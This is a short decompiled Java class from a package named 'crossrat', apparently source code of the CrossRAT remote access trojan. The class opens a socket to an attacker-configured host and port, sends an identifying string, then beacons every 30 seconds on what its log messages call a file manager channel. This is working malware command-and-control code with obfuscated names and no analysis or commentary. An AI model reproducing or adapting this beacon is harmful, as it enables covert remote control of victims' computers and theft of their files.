package crossrat;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

final class f extends Thread {
   public final void run() {
      new e();
      Socket var1 = null;

      try {
         System.err.println("FILE MANAGER CONNECT");
         k.l = var1 = new Socket(k.b, k.c);
         (new DataOutputStream(var1.getOutputStream())).writeBytes(k.g + k.d + k.z + k.d + "&&&");

         while(true) {
            (new DataOutputStream(k.l.getOutputStream())).writeBytes(k.A + k.d + "&&&");

            try {
               Thread.sleep(30000L);
            } catch (Exception var4) {
               ;
            }
         }
      } catch (Exception var5) {
         try {
            var1.close();
         } catch (IOException var3) {
            var3.printStackTrace();
         }

         System.err.println("FILE MANAGER ERROR CONNECT");
      }
   }
}
